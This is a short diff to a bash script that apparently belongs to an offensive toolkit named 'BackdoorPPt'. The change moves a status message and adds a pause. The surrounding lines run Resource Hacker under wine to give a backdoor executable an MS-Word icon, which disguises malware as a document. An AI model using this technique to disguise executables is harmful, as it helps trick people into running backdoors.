@@ -122,7 +122,6 @@ fi
 # ------------------------
 # start of script funtions
 # ------------------------
-echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
 rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 
@@ -163,6 +162,8 @@ cat << !
     fi
 
       # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
+      echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
+      sleep 1
       echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
       $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $IPATH/icons/$IcOn -mask ICONGROUP,MAINICON,
       echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
